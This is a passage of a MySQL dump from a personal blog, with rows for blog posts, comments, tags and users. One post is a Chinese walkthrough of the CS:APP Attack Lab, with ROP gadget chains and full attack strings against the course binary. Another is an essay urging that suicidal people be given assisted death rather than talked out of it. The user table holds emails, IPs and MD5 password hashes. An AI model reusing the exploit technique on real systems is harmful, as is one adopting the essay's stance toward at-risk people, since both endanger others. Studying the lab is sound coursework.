注入指令首地址\r\n```\r\n\r\n### 第二部分：返回导向编程攻击\r\n\r\n我们在第二部分中需要解决的同样是第一部分的后两个问题，只不过我们要采取不同的方式来进行攻击。\r\n\r\n为什么我们之前采取的代码注入的攻击手段无法在这个程序中起作用呢？这是国因为这个程序对代码注入攻击采取了两种防护方式：\r\n\r\n- 栈随机化，使得程序每次运行时栈的地址都不相同，我们无法得知我们注入的攻击代码的地址，也无法在攻击代码中硬编码栈中的地址。\r\n- 标记内存中的栈段为不可执行，这意味着注入在栈中的代码无法被程序执行。\r\n\r\n尽管这两种手段有效地避免了代码注入攻击，但是我们仍然可以找到方式让程序执行我们想要去执行的指令。\r\n\r\n#### 攻击方式\r\n\r\n现在我们无法使用栈来存放代码，但是我们仍可以设置栈中的内容。不能注入代码去执行，我们还可以利用程序中原有的代码，利用`ret`指令跳转的特性，去执行程序中已经存在的指令。具体的方式如下：\r\n\r\n我们可以在程序的汇编代码中找到这样的代码：\r\n\r\n```\r\n0000000000400f15 <setval_210>:\r\n400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi)\r\n400f1b: c3 retq\r\n```\r\n\r\n这段代码的本意是\r\n\r\n```\r\nvoid setval_210(unsigned *p)\r\n{\r\n    *p = 3347663060U;\r\n}\r\n```\r\n\r\n这样一个函数，但是通过观察我们可以发现，汇编代码的最后部分：`48 89 c7 c3`又可以代表\r\n\r\n```\r\nmovq %rax, %rdi\r\nret\r\n```\r\n\r\n这两条指令（指令的编码可以见讲义中的附录）。\r\n\r\n第1行的`movq`指令可以作为攻击代码的一部分来使用，那么我们怎么去执行这个代码呢？我们知道这个函数的入口地址是`0x400f15`，这个地址也是这条指令的地址。我们可以通过计算得出`48 89 c7 c3`这条指令的首地址是`0x400f18`，我们只要把这个地址存放在栈中，在执行`ret`指令的时候就会跳转到这个地址，执行`48 89 c7 c3`编码的指令。同时，我们可以注意到这个指令的最后是`c3`编码的是`ret`指令，利用这一点，我们就可以把多个这样的指令地址依次放在栈中，每次`ret`之后就会去执行栈中存放的下一个地址指向的指令，只要合理地放置这些地址，我们就可以执行我们想要执行的命令从而达到攻击的目的。\r\n\r\n![img](https://www.viseator.com/images/attacklab05.png)\r\n\r\n这样的一串以`ret`结尾的指令，被称为`gadget`。我们要攻击的程序中为我们设置了一个`gadget_farm`，为我们提供了一系列这样可以执行的攻击指令，同时我们也只被允许使用程序中`start_farm`与`end_farm`函数标识之间的`gadget`来构建我们的攻击字符串。\r\n\r\n这种攻击方式被称为返回导向编程攻击。\r\n\r\n#### Level 2\r\n\r\n目的与之前的`Level 2`相同，我们需要为`rdi`赋上`cookie`值，再跳转到`touch2`函数执行，跳转到`touch2`只需要将`touch2`的入口地址放在最后一个`gadget`之后，在它的`ret`指令执行之后就会返回到`touch2`中。\r\n\r\n下面就要利用已有的`gadget`为`rdi`赋上我们想要的值。这里我们要将一个特定的值写入`rdi`，但是我们只可以使用栈来存放这个数值，同时不知道栈的地址，这个时候我们可以想到使用`pop`指令令这个值从栈中弹出到寄存器中。\r\n\r\n查看`gadget`中提供的我们可以执行指令。发现\r\n\r\n```\r\n00000000004019a7 <addval_219>: \r\n  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax\r\n  4019ad:	c3                   	retq  \r\n```\r\n\r\n中最后的字节为`58 90 c3`，这个三个字节分别编码了三条指令：\r\n\r\n```\r\npopq %rax\r\nnop\r\nret\r\n```\r\n\r\n这个`nop`在这里当然不影响，利用这个`pop`指令我们就可以把栈中存放的内容弹出到`rax`中。接下来我们需要的是\r\n\r\n```\r\nmovq %rax,%rdi\r\n```\r\n\r\n这条指令，如果没有的话可以多传几次，正好我们发现了\r\n\r\n```\r\n00000000004019c3 <setval_426>: \r\n  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)\r\n  4019c9:	c3                   	retq   \r\n```\r\n\r\n中最后的字节`48 89 c7 90 c3`编码了这样的指令。\r\n\r\n我们分别计算这些需要执行的`gadget`的指令地址，写成攻击字符串：\r\n\r\n```\r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00\r\nab 19 40 00 00 00 00 00 # popq %rax \r\nfa 97 b9 59 00 00 00 00 # cookie （popq的目标）\r\na2 19 40 00 00 00 00 00 # movq %rax,%rdi\r\nec 17 40 00 00 00 00 00 # 返回到 touch2\r\n```\r\n\r\n#### Level 3\r\n\r\n攻击目标与之前的`Level 3`相同，需要将`rdi`指向`cookie`的字符串表示的首地址。\r\n\r\n目标字符串毫无疑问还是存放在栈中的，但是我们如何在栈地址随机化的情况下去获取我们放在栈中的字符串的首地址呢？\r\n\r\n查看`gadget_farm`中提供的`gadget`后，我们可以发现可以执行的命令中有\r\n\r\n```\r\nmovq %rsp,%rax\r\nret\r\n```\r\n\r\n这样一条，可以保存当前的`rsp`值，但是我们面临一个问题，这条命令执行时`rsp`的值为下一个地址，如果下一个地址中存放了目标字符串，那么命令就无法继续执行下去，也无法进入`touch3`函数了。\r\n\r\n除此之外，似乎没有别的`gadget`可以帮助我们获取`rsp`的地址了。\r\n\r\n我在这个地方卡了好几个小时，最后在别人的提示下才发现`gadget_farm`中有这样一个`gadget`画风与其他的不太一样：\r\n\r\n```\r\n00000000004019d6 <add_xy>: \r\n  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax\r\n  4019da:	c3                   	retq   \r\n```\r\n\r\n这明明就是一个可以直接使用的函数！它的作用是将`rdi`与`rsi`中的值相加后存放在`rax`中。\r\n\r\n有了这个，我们就可以把`rsp`的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。\r\n\r\n同时还要注意的是，这里有些`gadget`藏得比较隐蔽，讲义中暗示我们有一些两字节编码的指令实际上没有任何影响，它们之前的指令同样也是可以使用的。\r\n\r\n仔细找出所有可以执行的指令并整理之后我得出了这样一张图：\r\n\r\n![img](https://www.viseator.com/images/attacklab06.png)\r\n\r\n目标字符串存放的位置一定在`touch3`地址之上（原因见前文）。\r\n\r\n由于相加操作只能对`rsi`与`rdi`进行，经过观察可以发现栈地址是一个8字节值，所以无法通过下面这条`movl`组成的路来传递，但是我们的偏移值完全可以。所以我们的思路就定下了，把`rsp`的值存放在`rdi`中，把偏移量的值通过`popq`指令从栈中取出放在`esi`中，再利用`add_xy`函数将它们相加的结果存放到`rax`再转移到`rdi`中。这个偏移量是多少要等到我们的栈结构出来之后才可以确定。\r\n\r\n根据上面这些信息，我们可以把栈结构示意出来：\r\n\r\n![img](https://www.viseator.com/images/attacklab07.png)\r\n\r\n标注灰色的地方是我们计算偏移量的部分（从`rsp`读入时开始），可以计算出偏移量为`4 x 8 = 32 = 0x20`，再依此计算各命令的地址、构建出我们的攻击字符串：\r\n\r\n```\r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 \r\n00 00 00 00 00 00 00 00 # 前0x28个字符填充0x00\r\ncc 19 40 00 00 00 00 00 # popq %rax\r\n20 00 00 00 00 00 00 00 # 偏移量\r\n42 1a 40 00 00 00 00 00 # movl %eax,%edx\r\n69 1a 40 00 00 00 00 00 # movl %edx,%ecx\r\n27 1a 40 00 00 00 00 00 # movl %ecx,%esi\r\n06 1a 40 00 00 00 00 00 # movq %rsp,%rax\r\nc5 19 40 00 00 00 00 00 # movq %rax,%rdi\r\nd6 19 40 00 00 00 00 00 # add_xy\r\nc5 19 40 00 00 00 00 00 # movq %rax,%rdi\r\nfa 18 40 00 00 00 00 00 # touch3地址\r\n35 39 62 39 39 37 66 61 # 目标字符串\r\n00 00 00 00 00 00 00 00 \r\n```\r\n\r\n### 实验小结\r\n\r\n`Attack Lab`与之前的两个实验相比还是比较简单的，但是最后一个阶段确实因为自己的观察不够细致浪费了大量的时间。也告诉我们不要受思维定势的左右，一味地去寻找可以使用的`gadget`而忽略了函数本身的作用。\r\n\r\n这次实验加强了我对于函数调用栈，字节序，`gdb`使用，汇编的理解。', '2022-07-05 13:44:11', 'Attack Lab的内容针对的是CS-APP中第三章中关于程序安全性描述中的栈溢出攻击。在这个Lab中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。本实验也是对旧版本中IA32编写', 'https://www.viseator.com/images/attacklab05.png', NULL, 0, NULL, NULL, '深入理解计算机系统（CS:APP) - Attack Lab详解', '2022-07-05 13:44:11', 1, NULL, 5, 0, 0, NULL, NULL);
INSERT INTO `t_blog` VALUES (00000000000000000183, NULL, NULL, '> 本短文旨在从一种架空短期现实的角度出发，围绕人类关于死亡的看法，对理想社会进行一定程度上的重构。\r\n\r\n人类的发展史是一部逐步**超越物种原始生物性**的历史：他们克服关于繁殖的原始欲望，在普遍程度上确立了一夫一妻制；突破自身懒惰与愚昧的桎梏，创造了农业文明、工业文明与现代科学体系；超越了构建森严等级制的趋势，逐步发展出以民主为核心的政治体系与以人人平等为原则的法律框架。从混沌的“原始汤”中起源的生命已是宇宙奏响的优雅旋律，而人类从史前分散的小团体发展成具备现代科学体系的庞大自组织网络群体，更是其中无与伦比的华丽篇章。\r\n\r\n宇宙在时间上的边界决定了人类文明迟早要面对一个沉重的历史话题：**死亡**。正如粒子湮灭、生物体更替、恒星的壮丽终结，物质的运动性揭示了人类生物**个体消亡的必然**；而宇宙也将因热力学第二定律定义的时间之矢逐步走向无尽的无序，这枚“矢”也终将被磨穿棱角，不复存在——一切物理量都不随时间有所变化，而那也是人类**文明存在的理论上界**。\r\n\r\n然而，尽管人类克服了诸多原始生物性，但仍有一种最基本的倾向仍**未被普遍的认知所突破**：存活的本能。生物体存活的本能是如此彻底，以至于它们的整套神经系统都或多或少地围绕“趋利避害”的主题，以使得自身的基因能够存在且维续下去，从而在系统角度上形成正反馈，最终的结果是地球上的绝大多数生物体的所有活动都以个体与群体的存活为主题。\r\n\r\n对于生物体来说，它们的“利”植根于“存活”本身；而实现了超越的人类物种逐步构建了一套价值体系，来承担“利”这一概念实体，它们包括智慧、自由、忠诚、平等等为代表的普世价值观。对死亡的原始倾向性塑造了“趋利避害”的本能，而被人类改造过的“趋利避害”原则应当彻底重塑人类对死亡的认识——但事实不然：人类的葬礼哭天抢地，人类的医疗体系以救死为绝对责任，人类的法律中人权的根本在于生命权，而非**超脱生死的、以价值实现为核心的权利**。人类的认知往往倾向于对细枝末节进行修修补补，而忽视具备革命性质的、事物内部的根本矛盾。\r\n\r\n正如先哲突破欧氏几何平行公理创造出的一套全新几何体系，人类迟早也会认识到，革新自己的死亡观，将“价值实现”而非“存活”放在基本公理的位置，将彻底改变社会的根本属性。“价值实现”这一概念除了具有功利主义中“**社会效益总和最大化**”以外，还应当具备自由主义中**对个体价值的关注与认可**之属性。从价值实现的角度来讲，死亡也可能成为一种具有价值的选择：从现在的角度来看，因舍己为人而牺牲的场合中，受益者的利益来源于他人失去的生命权，一定程度上带有“不义”的色彩，而在新的价值体系中，牺牲者的价值实现将高于其生命权，从而破除了该逻辑矛盾；对于身患绝症且承受巨大痛苦的病人，其亲友往往将生命权置于第一位，进行无谓的治疗与抢救，让病人承受绝望与苦楚，而自己的内心却仍在接受虚伪良心的馈赠，但是在新的价值体系中，人们将承认无谓治疗对于价值实现的损害，从而尽快采取临终关怀措施，减轻病人死亡的痛苦。\r\n\r\n上述论述已显现出将“存活”本身从价值神坛上拉下所带来的改变，现在让我们进一步推进，看看新的“公理体系”将会如何对人类关于理想社会的构想进行重塑。在重塑了死亡观的理想社会中，人们对待自杀者的态度将不再是劝说和阻止，这并不意味着人们会放纵自杀行为。相反，他们将选择存活抑或是选择死亡看作是重大的人生抉择，当有人企图结束自己的生命时，社会机构提供的应当是深入的交流，在确认其选择死亡的价值实现属性时，提供良好的主动死亡辅助措施，并在亲友的陪伴下走向终结——那也将是价值的新生。其亲友尽管有所不舍，但仍会遵从其个体的自由意志，而不是将人际关系的羁绊作为强加的义务，阻止他人的自我选择。在这样的理想社会中，“死亡权”将成为独立于“生命权”的另一重要事实权利，出现在法律条文中的将不再是“保护公民的生命权不受非法侵害”，而应当是“保护公民的生命权与选择死亡的权利不受非法侵害”。帮助他人正确认识自己的人生，正确选择继续生存抑或是终结生命的行为，将受到褒扬。同样地，法律仍应当以未成年人对社会与世界的认识有限为由，一定程度上限制其相关权利，从而避免出现年幼者自杀的极端情况。\r\n\r\n在未来的理想社会，人类基于对生产力与生产关系的认识，发展出高度发达的生产力与精神文明，也将对自身的原始生物性进行根本性的超越，而最终超越的，应当是生物体对于死亡的认识。人类将把价值实现而非存活，放在整套认知体系的最底层，从而对理想社会的运行逻辑进行重构。届时，人类无论是个体还是群体，对于事物终结这件事情，都会用极为坦然的态度去面对，也能实现中国哲学中“事生不事死”的现实追求。人类终将面对文明的消亡，而对于他们来说，**绚丽的宇宙如黄粱一梦，璀璨的文明存在过，便已是最大的价值**。\r\n\r\n', '2022-07-05 13:54:34', '旨在从一种架空短期现实的角度出发，围绕人类关于死亡的看法，对理想社会进行一定程度上的重构。', 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_135156_37.jpg', NULL, 0, NULL, NULL, '从死亡观出发的理想社会重构', '2022-07-05 13:54:34', 0, NULL, 5, 0, 0, NULL, NULL);

-- ----------------------------
-- Table structure for t_blog_t_tag
-- ----------------------------
DROP TABLE IF EXISTS `t_blog_t_tag`;
CREATE TABLE `t_blog_t_tag`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `blogs_id` bigint(20) NOT NULL COMMENT '博客id',
  `tags_id` bigint(20) NOT NULL COMMENT '标签id',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `FKhl5bn19gf2sq5o31s7amn0l1t`(`tags_id`) USING BTREE,
  INDEX `FKk1nf67s05jh2pbvf45gmhvhja`(`blogs_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 16 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_blog_t_tag
-- ----------------------------
INSERT INTO `t_blog_t_tag` VALUES (1, 149, 30);
INSERT INTO `t_blog_t_tag` VALUES (2, 149, 31);
INSERT INTO `t_blog_t_tag` VALUES (3, 153, 32);
INSERT INTO `t_blog_t_tag` VALUES (4, 153, 33);
INSERT INTO `t_blog_t_tag` VALUES (5, 154, 34);
INSERT INTO `t_blog_t_tag` VALUES (6, 154, 35);
INSERT INTO `t_blog_t_tag` VALUES (7, 157, 34);
INSERT INTO `t_blog_t_tag` VALUES (8, 155, 32);
INSERT INTO `t_blog_t_tag` VALUES (9, 155, 33);
INSERT INTO `t_blog_t_tag` VALUES (10, 161, 36);
INSERT INTO `t_blog_t_tag` VALUES (11, 162, 37);
INSERT INTO `t_blog_t_tag` VALUES (12, 164, 38);
INSERT INTO `t_blog_t_tag` VALUES (13, 164, 39);
INSERT INTO `t_blog_t_tag` VALUES (14, 165, 31);
INSERT INTO `t_blog_t_tag` VALUES (15, 165, 33);

-- ----------------------------
-- Table structure for t_comment
-- ----------------------------
DROP TABLE IF EXISTS `t_comment`;
CREATE TABLE `t_comment`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '头像',
  `content` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容',
  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '邮箱',
  `nickname` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '昵称',
  `blog_id` bigint(20) NULL DEFAULT NULL COMMENT '博客id',
  `ip` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'ip',
  `pass` int(11) NULL DEFAULT 0 COMMENT '0:审核中1:成功2:失败',
  `admin_comment` bit(1) NOT NULL DEFAULT b'0' COMMENT '作者是否回复',
  `create_time` datetime NULL DEFAULT NULL COMMENT '创建时间',
  `parent_comment_id` bigint(20) NULL DEFAULT NULL COMMENT '上一级评论',
  PRIMARY KEY (`id`) USING BTREE,
  INDEX `FKke3uogd04j4jx316m1p51e05u`(`blog_id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 19 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_comment
-- ----------------------------
INSERT INTO `t_comment` VALUES (1, '/images/otherUserAvatar.jpg', '.klk;kl;', '26@qq.com', 'shmily', 163, '182.110.30.58', 1, b'0', '2020-04-11 12:35:24', -1);
INSERT INTO `t_comment` VALUES (2, '/images/otherUserAvatar.jpg', '的深V', '2681561311@qq.com', 'shmily', 164, '182.109.236.245', 1, b'0', '2020-04-14 08:55:42', -1);
INSERT INTO `t_comment` VALUES (3, '/images/islizx.jpg', 'test', 'islizx@163.com', 'RAYMOND', 165, '0:0:0:0:0:0:0:1', 1, b'1', '2020-04-24 19:56:23', -1);
INSERT INTO `t_comment` VALUES (4, '/images/otherUserAvatar.jpg', '111', '111@1.com', '1', 164, '0:0:0:0:0:0:0:1', 0, b'0', '2022-06-27 15:33:29', -1);
INSERT INTO `t_comment` VALUES (7, NULL, '这是留言111', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 01:54:44', NULL);
INSERT INTO `t_comment` VALUES (8, NULL, '留言2222222', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 02:01:32', NULL);
INSERT INTO `t_comment` VALUES (9, NULL, '留言33333', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 02:01:38', NULL);
INSERT INTO `t_comment` VALUES (10, NULL, '留言4444', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 02:01:44', NULL);
INSERT INTO `t_comment` VALUES (11, NULL, '留言5555555555', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 02:01:54', NULL);
INSERT INTO `t_comment` VALUES (12, NULL, '留言666666', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 02:02:02', NULL);
INSERT INTO `t_comment` VALUES (13, NULL, '留言7777777', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 02:02:13', NULL);
INSERT INTO `t_comment` VALUES (16, NULL, '留言888888', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 03:12:02', NULL);
INSERT INTO `t_comment` VALUES (17, NULL, 'admin你好', NULL, 'michael', 3, NULL, NULL, b'0', '2022-07-05 09:47:44', NULL);
INSERT INTO `t_comment` VALUES (18, NULL, '你好admin', NULL, 'michael', 2, NULL, NULL, b'0', '2022-07-05 09:55:45', NULL);

-- ----------------------------
-- Table structure for t_friendship
-- ----------------------------
DROP TABLE IF EXISTS `t_friendship`;
CREATE TABLE `t_friendship`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NOT NULL COMMENT '用户id',
  `friend_id` bigint(20) NOT NULL COMMENT '好友id',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_friendship
-- ----------------------------
INSERT INTO `t_friendship` VALUES (7, 3, 6);
INSERT INTO `t_friendship` VALUES (8, 6, 3);

-- ----------------------------
-- Table structure for t_history
-- ----------------------------
DROP TABLE IF EXISTS `t_history`;
CREATE TABLE `t_history`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) NULL DEFAULT NULL COMMENT '用户id',
  `visitor_id` bigint(20) NULL DEFAULT NULL COMMENT '访客id',
  `visitTime` datetime NULL DEFAULT NULL COMMENT '访问时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_history
-- ----------------------------

-- ----------------------------
-- Table structure for t_notice
-- ----------------------------
DROP TABLE IF EXISTS `t_notice`;
CREATE TABLE `t_notice`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `sender` bigint(20) NOT NULL COMMENT '发送者',
  `receiver` bigint(20) NOT NULL COMMENT '接受者',
  `status` bit(1) NOT NULL COMMENT '是否已读',
  `sendtime` datetime NOT NULL COMMENT '发送时间',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_notice
-- ----------------------------

-- ----------------------------
-- Table structure for t_tag
-- ----------------------------
DROP TABLE IF EXISTS `t_tag`;
CREATE TABLE `t_tag`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '标签名称',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `name`(`name`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 40 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_tag
-- ----------------------------
INSERT INTO `t_tag` VALUES (30, 'TCP', '');
INSERT INTO `t_tag` VALUES (31, 'UDP', '');
INSERT INTO `t_tag` VALUES (32, '个人网站', '');
INSERT INTO `t_tag` VALUES (33, 'SSM', '');
INSERT INTO `t_tag` VALUES (34, 'MYSQL', '');
INSERT INTO `t_tag` VALUES (35, '备份', '');
INSERT INTO `t_tag` VALUES (36, '容器', '');
INSERT INTO `t_tag` VALUES (37, '排序', '');
INSERT INTO `t_tag` VALUES (38, 'Spring', '');
INSERT INTO `t_tag` VALUES (39, 'Struts', '');

-- ----------------------------
-- Table structure for t_type
-- ----------------------------
DROP TABLE IF EXISTS `t_type`;
CREATE TABLE `t_type`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '类别名称',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  `icon` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '图标',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 61 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_type
-- ----------------------------
INSERT INTO `t_type` VALUES (53, '计算机网络', '', '');
INSERT INTO `t_type` VALUES (54, 'Java', '', '');
INSERT INTO `t_type` VALUES (55, '数据库', '', '');
INSERT INTO `t_type` VALUES (56, '面试', '', '');
INSERT INTO `t_type` VALUES (57, '设计模式', '', '');
INSERT INTO `t_type` VALUES (58, 'Spring', '', '');
INSERT INTO `t_type` VALUES (59, '数据结构与算法', '', '');
INSERT INTO `t_type` VALUES (60, 'Java架构', '', '');

-- ----------------------------
-- Table structure for t_user
-- ----------------------------
DROP TABLE IF EXISTS `t_user`;
CREATE TABLE `t_user`  (
  `id` bigint(20) NOT NULL AUTO_INCREMENT,
  `avatar` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '头像',
  `email` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '邮箱',
  `nickname` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '昵称',
  `password` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '密码',
  `type` bit(1) NULL DEFAULT b'0' COMMENT '类型',
  `username` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '' COMMENT '用户名',
  `url` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '首页',
  `last_login_ip` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '上次登录ip',
  `register_time` datetime NULL DEFAULT NULL COMMENT '注册时间',
  `last_login_time` datetime NULL DEFAULT NULL COMMENT '上次登录时间',
  `status` bit(1) NOT NULL DEFAULT b'0' COMMENT '状态',
  `update_time` datetime NULL DEFAULT NULL COMMENT '更新时间',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '描述',
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE INDEX `username`(`username`) USING BTREE,
  UNIQUE INDEX `email`(`email`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 11 CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = DYNAMIC;

-- ----------------------------
-- Records of t_user
-- ----------------------------
INSERT INTO `t_user` VALUES (2, '/images/islizx.jpg', 'islizx@163.com', 'RAYMOND', '96e79218965eb72c92a549dd5a330112', b'1', 'admin', 'hello', '127.0.0.1', '2020-02-04 11:42:36', '2022-06-30 15:20:24', b'1', '2020-05-08 15:02:23', 'hello ');
INSERT INTO `t_user` VALUES (3, 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_130740_371_small.png', '381561834@qq.com', 'michael', 'a7f07f38fd64c670c18b5419a733df51', b'0', 'michael', NULL, NULL, '2022-07-01 00:35:25', NULL, b'1', NULL, '库里Fmvp');
INSERT INTO `t_user` VALUES (4, NULL, '111111111@qq.com', 'Curry', '96e79218965eb72c92a549dd5a330112', b'0', 'zmx', NULL, NULL, '2022-07-04 09:11:52', NULL, b'1', NULL, 'hahahahaha');
INSERT INTO `t_user` VALUES (5, 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_131242_581_small.jpeg', '1210257781@qq.com', 'beez', '96e79218965eb72c92a549dd5a330112', b'0', 'beez', NULL, NULL, '2022-07-05 09:15:31', NULL, b'0', NULL, '你看我漂亮吗');
INSERT INTO `t_user` VALUES (6, 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_085033_561_small.jpeg\n', '999999999@qq.com', NULL, '96e79218965eb72c92a549dd5a330112', b'0', 'beez1', NULL, NULL, '2022-07-05 09:20:59', NULL, b'0', NULL, NULL);
INSERT INTO `t_user` VALUES (7, 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_085033_561_small.jpeg\n', '888888888@qq.com', NULL, '96e79218965eb72c92a549dd5a330112', b'0', 'beez2', NULL, NULL, '2022-07-05 09:22:39', NULL, b'0', NULL, NULL);
INSERT INTO `t_user` VALUES (10, 'https://zyk-xxx.oss-cn-hangzhou.aliyuncs.com//images/2022/7/20220705_085033_561_small.jpeg\n', '777777777@qq.com', NULL, '96e79218965eb72c92a549dd5a330112', b'0', 'beez6', NULL, NULL, '2022-07-05 09:44:15', NULL, b'0', NULL, NULL);

SET FOREIGN_KEY_CHECKS = 1;
